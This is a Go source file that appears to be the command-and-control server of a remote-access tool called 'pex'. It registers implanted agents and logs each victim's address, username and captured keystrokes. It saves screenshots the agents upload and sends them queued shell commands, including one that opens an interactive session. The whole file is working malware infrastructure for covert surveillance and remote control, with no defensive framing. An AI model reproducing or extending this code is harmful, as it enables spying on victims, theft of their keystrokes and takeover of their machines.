package c2

import (
	"bytes"
	"image"
	"image/png"
	"io"
	"log/slog"
	"net/http"
	"os"
	"time"

	"github.com/google/uuid"
	"github.com/hardal7/pex/internal/config"
)

func Serve() {
	go GetCommands()
	go RunCommands()

	root := http.NewServeMux()
	root.Handle("/", http.HandlerFunc(requestHandler()))

	server := http.Server{
		Addr:    ":" + config.BeaconPort,
		Handler: root,
	}
	slog.Info("Starting server on port: " + config.BeaconPort)
	err := server.ListenAndServe()
	if err != nil {
		slog.Error("Failed to start server: " + err.Error())
	}
}

type ServerState struct {
	registeredAgents []string
	selectedAgent    string
}

var state ServerState = ServerState{selectedAgent: "none"}

func requestHandler() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Register") == "true" {
			uuid, _ := uuid.NewRandom()
			w.Write([]byte(uuid.String()))
			state.registeredAgents = append(state.registeredAgents, uuid.String())
			slog.Info("Registered agent: " + r.RemoteAddr + " with UUID: " + uuid.String())
		} else if r.Header.Get("UUID") == state.selectedAgent {
			slog.Info("Connected Agent: \n")
			slog.Info("Address: " + r.RemoteAddr)
			slog.Info("Username: " + r.Header.Get("Username"))
			if r.Header.Get("Keys") != "" {
				slog.Info("Keys Pressed: " + r.Header.Get("Keys"))
			}
			response, err := io.ReadAll(r.Body)
			if err != nil {
				slog.Error("Failed reading request body: " + err.Error())
				return
			}

			if r.Header.Get("Content-Type") == "image/png" {
				slog.Info("Received response with image")
				image, _, _ := image.Decode(bytes.NewReader(response))
				out, err := os.Create("./" + r.RemoteAddr + ":" + time.Now().Format("2006-01-01 00:00:00") + ".png")
				if err != nil {
					slog.Info("Failed creating image file")
				}
				defer out.Close()
				png.Encode(out, image)
			} else if string(response) != "" {
				slog.Info("Received response:\n" + string(response))
			} else {
				mu.Lock()
				if task.Command == "SESSION" {
					slog.Info("Initiating session")
					go InitiateSession()
				}
				requestCommand(w)
				mu.Unlock()
			}
		} else {
			w.Write([]byte(""))
			slog.Info("Pinged agent: " + r.RemoteAddr)
		}
	}
}

func requestCommand(w http.ResponseWriter) {
	if task.Command != "" {
		w.Write([]byte(task.Command))
		slog.Info("Command requested: " + task.Command)
		task.Command = ""
	} else {
		w.Write([]byte(""))
		slog.Info("Pinged agent")
	}
}
